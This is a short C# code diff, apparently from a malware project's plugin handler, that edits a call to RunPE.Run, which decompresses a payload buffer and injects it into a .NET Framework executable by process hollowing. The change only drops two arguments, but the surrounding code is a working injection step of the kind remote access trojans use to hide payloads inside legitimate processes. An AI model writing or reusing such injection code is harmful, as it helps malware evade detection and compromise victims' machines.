@@ -88,7 +88,7 @@ namespace Plugin.Handler
                     {
                         try
                         {
-                            RunPE.Run(Path.Combine(RuntimeEnvironment.GetRuntimeDirectory().Replace("Framework64", "Framework"), injection), Methods.Decompress(buffer), "", true);
+                            RunPE.Run(Path.Combine(RuntimeEnvironment.GetRuntimeDirectory().Replace("Framework64", "Framework"), injection), Methods.Decompress(buffer));
                         }
                         catch (Exception ex)
                         {
